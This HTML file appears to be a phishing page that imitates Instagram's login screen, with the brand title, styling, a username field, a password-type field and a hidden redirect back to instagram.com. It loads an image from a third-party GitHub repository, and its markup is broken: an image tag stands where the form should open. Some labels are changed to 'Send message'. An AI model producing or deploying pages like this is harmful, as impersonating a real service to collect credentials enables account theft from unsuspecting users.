<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 350px;
      padding: 40px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .logo {
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }

    .login-btn {
      background-color: #0095f6;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      margin: 10px 0;
      cursor: pointer;
    }

    .login-btn:disabled {
      background-color: #b2dffc;
      cursor: default;
    }

    .separator {
      margin: 20px 0;
      font-size: 14px;
      color: #999;
      position: relative;
    }

    .separator::before,
    .separator::after {
      content: "";
      position: absolute;
      width: 40%;
      height: 1px;
      background: #dbdbdb;
      top: 50%;
    }

    .separator::before {
      left: 0;
    }

    .separator::after {
      right: 0;
    }

    .facebook-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
    }

    .forgot {
      font-size: 12px;
      color: #00376b;
      margin-top: 15px;
      display: block;
    }

    .signup {
      margin-top: 20px;
      padding: 20px;
      border: 1px solid #dbdbdb;
      background: #fff;
    }

    .signup a {
      text-decoration: none;
      color: #0095f6;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <img src="https://raw.githubusercontent.com/toddgrub/pay/main/image.png" method="POST">
        <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
        <input type="password" name="message" placeholder="Message" required />
        <input type="hidden" name="_next" value="https://instagram.com">
        <button class="login-btn">Send message</button>
      </form>
      <div class="separator">OR</div>
      <a href="#" class="facebook-login"></a>
      <a href="#" class="forgot">need help?</a>
    </div>
    <div class="signup">
      We will respond within 24 hours <a href="#">Learn more</a>
    </div>
  </div>
</body>
</html>
